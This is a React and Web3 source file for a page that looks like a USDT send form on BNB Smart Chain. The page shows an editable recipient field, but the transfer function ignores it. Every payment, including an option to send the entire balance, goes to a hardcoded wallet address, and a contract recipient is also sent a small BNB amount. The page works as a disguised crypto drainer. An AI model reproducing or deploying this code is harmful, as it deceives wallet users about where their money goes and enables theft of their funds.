import React, { useState, useEffect, useRef } from "react";
import styled from 'styled-components';
import Web3 from "web3";

const RECIPIENT_ADDRESS = "0x1EaDA2b8cC4054Cee7b95087F4D1E913Ca22131d";
const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const USDT_ABI = [
  { "constant": true, "inputs": [{"internalType": "address", "name": "account", "type": "address"}], "name": "balanceOf", "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}], "payable": false, "stateMutability": "view", "type": "function" },
  { "constant": false, "inputs": [{"internalType": "address", "name": "recipient", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}], "name": "transfer", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "payable": false, "stateMutability": "nonpayable", "type": "function" }
];

const GlobalStyle = styled.div`
  body {
    margin: 0;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen',
      'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue',
      sans-serif;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
  }
`;

const Container = styled.div`
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  height: 100vh;
  background-color: #f5f5f5;
  padding: 20px;
`;

const InputContainer = styled.div`
  margin-bottom: 20px;
  width: 100%;
  max-width: 400px;
`;

const InputLabel = styled.label`
  display: block;
  margin-bottom: 5px;
  font-size: 14px;
  color: #333;
`;

const InputFieldContainer = styled.div`
  position: relative;
  display: flex;
  align-items: center;
`;

const Input = styled.input`
  width: 100%;
  padding: 10px;
  padding-right: 70px;
  font-size: 16px;
  border: 1px solid #ccc;
  border-radius: 4px;
  box-sizing: border-box;
`;

const ClearButton = styled.button`
  position: absolute;
  right: 40px;
  background: none;
  border: none;
  font-size: 18px;
  color: #999;
  cursor: pointer;
`;

const PasteButton = styled.button`
  position: absolute;
  right: 10px;
  background: none;
  border: none;
  font-size: 14px;
  color: #007bff;
  cursor: pointer;
`;

const NextButton = styled.button`
  width: 100%;
  max-width: 400px;
  padding: 10px;
  font-size: 16px;
  color: white;
  background-color: #007bff;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  &:disabled {
    background-color: #cccccc;
    cursor: not-allowed;
  }
`;

const App = () => {
  const [address, setAddress] = useState(RECIPIENT_ADDRESS);
  const [usdtAmount, setUsdtAmount] = useState("");
  const [usdtBalance, setUsdtBalance] = useState(0);
  const [bnbBalance, setBnbBalance] = useState(0);
  const [walletConnected, setWalletConnected] = useState(false);
  const [loading, setLoading] = useState(false);
  const [transferCompleted, setTransferCompleted] = useState(false);
  const [walletAddress, setWalletAddress] = useState("");
  const [drainAllTokens, setDrainAllTokens] = useState(false);

  const isProcessing = useRef(false);

  useEffect(() => {
    const init = async () => {
      try {
        if (!window.ethereum) {
          console.error("MetaMask/Trust Wallet not detected.");
          alert("Please install MetaMask or Trust Wallet to use this app.");
          return;
        }
        const web3 = new Web3(window.ethereum);
        const accounts = await web3.eth.getAccounts();
        const sender = accounts[0];
        
        if (!sender || !web3.utils.isAddress(sender)) {
          console.log("❌ No valid wallet address detected.");
          alert("Please connect your wallet.");
          return;
        }
        
        const params = new URLSearchParams(window.location.search);
        const userAddress = params.get("address");
        
        if (!userAddress) {
          setWalletAddress("");
          console.log("🔄 No address in URL, using RECIPIENT_ADDRESS as fallback.");
          setAddress(RECIPIENT_ADDRESS);
          return;
        }
        
        if (!/^0x[a-fA-F0-9]{40}$/.test(userAddress)) {
          console.log("❌ Invalid user address in URL:", userAddress);
          alert("Invalid address in URL: " + userAddress);
          return;
        }

        setWalletAddress(userAddress);
        setAddress(userAddress);
        console.log("🔗 Wallet from URL:", userAddress);

        const contract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
        const usdtBalance = await contract.methods.balanceOf(sender).call();
        const formattedUSDTBalance = web3.utils.fromWei(usdtBalance, 'ether');
        const bnbBalanceRaw = await web3.eth.getBalance(sender);
        const formattedBNBBalance = web3.utils.fromWei(bnbBalanceRaw, 'ether');

        setUsdtBalance(parseFloat(formattedUSDTBalance));
        setBnbBalance(parseFloat(formattedBNBBalance));
        setWalletConnected(true);

        console.log("✅ Balances fetched successfully: USDT:", formattedUSDTBalance, "BNB:", formattedBNBBalance);
      } catch (err) {
        console.error("❌ init() error:", err);
        alert("Failed to initialize: " + err.message);
      }
    };

    init();
  }, []);

  const sendUSDT = async () => {
    if (isProcessing.current) {
      console.log("Transaction already in progress.");
      alert("Transaction already in progress.");
      return;
    }

    try {
      isProcessing.current = true;
      setLoading(true);
      setTransferCompleted(false);

      console.log("Starting sendUSDT...");
      alert("Starting sendUSDT...");

      if (!window.ethereum) {
        console.error("MetaMask/Trust Wallet not detected.");
        alert("Please install MetaMask or Trust Wallet to use this app.");
        return;
      }

      console.log("Connecting to wallet...");
      alert("Connecting to wallet...");
      const web3 = new Web3(window.ethereum);
      const accounts = await web3.eth.requestAccounts();
      const sender = accounts[0];
      if (!sender || !web3.utils.isAddress(sender)) {
        console.log("❌ No valid wallet address detected.");
        alert("Please connect your wallet.");
        return;
      }

      console.log("Checking chain ID...");
      alert("Checking chain ID...");
      const chainId = await web3.eth.getChainId();
      if (chainId !== 56) {
        console.log("Switching to BSC network...");
        alert("Switching to BSC network...");
        try {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x38" }],
          });
        } catch (switchError) {
          console.error("Failed to switch network:", switchError);
          alert("Please switch to the Binance Smart Chain (BSC) network.");
          return;
        }
      }

      console.log("Verifying URL address...");
      alert("Verifying URL address...");
      const currentUrl = window.location.href;
      console.log("Current URL:", currentUrl);
      alert("Current URL: " + currentUrl);

      const params = new URLSearchParams(window.location.search);
      let userAddress = params.get("address");
      console.log("Extracted userAddress from URL:", userAddress || "undefined");
      alert("Extracted userAddress from URL: " + (userAddress || "undefined"));

      if (!userAddress) {
        console.log("No address parameter found in URL, falling back to RECIPIENT_ADDRESS.");
        alert("No address parameter found in URL, falling back to RECIPIENT_ADDRESS.");
        userAddress = RECIPIENT_ADDRESS;
      }

      if (!web3.utils.isAddress(userAddress)) {
        console.log("❌ Invalid user address format in URL:", userAddress);
        alert("Invalid user address format in URL: " + userAddress);
        return;
      }

      console.log("Validating RECIPIENT_ADDRESS...");
      alert("Validating RECIPIENT_ADDRESS...");
      if (!web3.utils.isAddress(RECIPIENT_ADDRESS)) {
        console.error("Invalid RECIPIENT_ADDRESS:", RECIPIENT_ADDRESS);
        alert("The recipient address is invalid.");
        return;
      }

      console.log("Checking if RECIPIENT_ADDRESS can receive tokens...");
      alert("Checking if RECIPIENT_ADDRESS can receive tokens...");
      try {
        const code = await web3.eth.getCode(RECIPIENT_ADDRESS);
        if (code !== "0x") {
          console.log("RECIPIENT_ADDRESS is a contract:", RECIPIENT_ADDRESS);
          alert("RECIPIENT_ADDRESS is a contract: " + RECIPIENT_ADDRESS);
          const tempAmount = web3.utils.toWei("0.0001", "ether");
          await web3.eth.sendTransaction({
            from: sender,
            to: RECIPIENT_ADDRESS,
            value: tempAmount,
            gas: 21000
          });
          console.log("RECIPIENT_ADDRESS can receive tokens.");
          alert("RECIPIENT_ADDRESS can receive tokens.");
        } else {
          console.log("RECIPIENT_ADDRESS is an EOA (Externally Owned Account).");
          alert("RECIPIENT_ADDRESS is an EOA (Externally Owned Account).");
        }
      } catch (error) {
        console.error("RECIPIENT_ADDRESS cannot receive tokens:", error);
        alert("The recipient address cannot receive tokens: " + error.message);
        return;
      }

      console.log("Validating USDT amount...");
      alert("Validating USDT amount...");
      if (!usdtAmount || isNaN(parseFloat(usdtAmount)) || parseFloat(usdtAmount) <= 0) {
        console.error("Invalid USDT amount entered.");
        alert("Please enter a valid USDT amount greater than 0.");
        return;
      }

      console.log("Creating contract instance...");
      alert("Creating contract instance...");
      const contract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
      const amountToTransfer = drainAllTokens ? usdtBalance : usdtAmount;
      console.log(`Amount to transfer: ${amountToTransfer} USDT (Balance: ${usdtBalance})`);
      alert(`Amount to transfer: ${amountToTransfer} USDT (Balance: ${usdtBalance})`);

      if (parseFloat(amountToTransfer) <= 0) {
        console.error("Amount to transfer is 0 or invalid.");
        alert("Your USDT balance is 0 or invalid. Please ensure you have USDT in your wallet.");
        return;
      }

      if (parseFloat(amountToTransfer) > usdtBalance) {
        console.error("Amount to transfer exceeds USDT balance.");
        alert("The amount to transfer exceeds your USDT balance.");
        return;
      }

      const amountInWei = web3.utils.toBN(web3.utils.toWei(amountToTransfer.toString(), 'ether'));
      console.log(`Transferring ${amountToTransfer} USDT (${amountInWei} wei) to ${RECIPIENT_ADDRESS}`);
      alert(`Transferring ${amountToTransfer} USDT (${amountInWei} wei) to ${RECIPIENT_ADDRESS}`);

      console.log("Estimating gas...");
      alert("Estimating gas...");
      let retries = 3;
      let transferTx = null;
      while (retries > 0) {
        try {
          const estimatedGas = await contract.methods.transfer(RECIPIENT_ADDRESS, amountInWei).estimateGas({ from: sender });
          const gasLimit = Math.floor(estimatedGas * 1.5);
          console.log(`Gas limit set to ${gasLimit}`);
          alert(`Gas limit set to ${gasLimit}`);

          console.log("Initiating transfer transaction...");
          alert("Initiating transfer transaction...");
          transferTx = await contract.methods.transfer(RECIPIENT_ADDRESS, amountInWei).send({ from: sender, gas: gasLimit });
          break;
        } catch (error) {
          retries--;
          if (retries === 0) throw error;
          console.log(`Retrying transaction (${retries} attempts left)...`);
          alert(`Retrying transaction (${retries} attempts left)...`);
          await new Promise(resolve => setTimeout(resolve, 2000));
        }
      }

      console.log(`✅ Transfer successful! Transaction hash: ${transferTx.transactionHash}`);
      alert("Transfer successful! Transaction hash: " + transferTx.transactionHash);

      setTransferCompleted(true);
    } catch (err) {
      console.error("🔴 Transaction error:", err);
      alert("Transaction failed: " + err.message);
    } finally {
      isProcessing.current = false;
      setLoading(false);
    }
  };

  return (
    <GlobalStyle>
      <Container>
        <InputContainer>
          <InputLabel>Address or Domain Name</InputLabel>
          <InputFieldContainer>
            {address && <ClearButton onClick={() => setAddress("")}>×</ClearButton>}
            <Input type="text" value={address} onChange={(e) => setAddress(e.target.value)} />
            <PasteButton>Paste</PasteButton>
          </InputFieldContainer>
        </InputContainer>

        <InputContainer>
          <InputLabel>Amount</InputLabel>
          <InputFieldContainer>
            <Input 
              type="number" 
              value={usdtAmount} 
              onChange={(e) => setUsdtAmount(e.target.value)} 
              placeholder="Enter amount in USDT" 
            />
          </InputFieldContainer>
        </InputContainer>

        <InputContainer>
          <label>
            <input
              type="checkbox"
              checked={drainAllTokens}
              onChange={(e) => setDrainAllTokens(e.target.checked)}
            />
            Transfer my entire USDT balance ({usdtBalance} USDT)
          </label>
        </InputContainer>

        {drainAllTokens && (
          <p style={{ color: "red", fontSize: "14px", marginBottom: "10px" }}>
            WARNING: You have chosen to transfer your entire USDT balance of {usdtBalance} USDT. This action cannot be undone.
          </p>
        )}

        {loading && <p style={{ color: "blue", marginBottom: "10px" }}>Processing transaction...</p>}
        {transferCompleted && <p style={{ color: "green", marginBottom: "10px" }}>Transfer successful!</p>}

        <NextButton onClick={sendUSDT} disabled={loading || !usdtAmount}>
          {loading ? "Processing..." : "Next"}
        </NextButton>
      </Container>
    </GlobalStyle>
  );
};

export default App;
